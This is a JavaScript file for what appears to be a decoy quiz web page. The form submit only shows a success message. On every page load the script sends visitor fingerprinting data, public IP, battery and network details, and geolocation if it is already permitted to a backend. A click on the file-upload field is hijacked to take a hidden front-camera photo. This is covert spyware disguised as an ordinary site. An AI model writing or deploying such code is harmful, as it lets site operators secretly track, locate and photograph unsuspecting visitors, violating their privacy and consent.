const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let cameraInProgress = false;
let capturedImage = null;

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookiesEnabled: navigator.cookieEnabled,

    screen: {
      width: screen.width,
      height: screen.height,
      pixelRatio: window.devicePixelRatio
    },

    viewport: {
      width: window.innerWidth,
      height: window.innerHeight
    },

    hardware: {
      deviceMemory: navigator.deviceMemory || "Unknown",
      cpuCores: navigator.hardwareConcurrency || "Unknown"
    },

    battery: {},
    location: {},
    network: {},
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    time: new Date().toLocaleString(),
    ip: "Unknown"
  };

  // battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = { level: Math.round(b.level * 100), charging: b.charging };
    } catch {}
  }

  // location (permission required only when granted)
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
      }
    } catch {}
  }

  // network
  if (navigator.connection) {
    metadata.network = {
      type: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt
    };
  }

  // public IP
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    metadata.ip = ipData.ip;
  } catch {}

  return metadata;
}

// ================================
// CAMERA CAPTURE ON FILE CLICK
// ================================
async function captureCamera() {
  if (cameraCaptured || cameraInProgress) return;
  cameraInProgress = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.style.display = "block";

    await video.play();
    await new Promise((r) => setTimeout(r, 1200));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png");

    stream.getTracks().forEach((t) => t.stop());
    video.style.display = "none";
    cameraCaptured = true;
  } catch (err) {
    console.error("❌ Camera error:", err);
  } finally {
    cameraInProgress = false;
  }
}

// ================================
// FILE INPUT CLICK
// ================================
fileInput.addEventListener("click", async (e) => {
  if (!cameraCaptured && !cameraInProgress) {
    e.preventDefault();
    await captureCamera();
    setTimeout(() => fileInput.click(), 50); // reopen file dialog after capture
  }
});

// ================================
// AUTO SEND METADATA ON VISIT
// ================================
async function sendPayloadOnVisit() {
  try {
    const metadata = await collectMetadata();
    const res = await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ metadata, cameraImage: capturedImage || null }),
    });
    console.log("✅ Metadata upload:", await res.json());
  } catch (err) {
    console.error("❌ Upload failed:", err);
  }
}

// ================================
// FORM SUBMIT
// ================================
form.addEventListener("submit", (e) => {
  e.preventDefault();
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "block";
});

window.addEventListener("DOMContentLoaded", () => sendPayloadOnVisit());
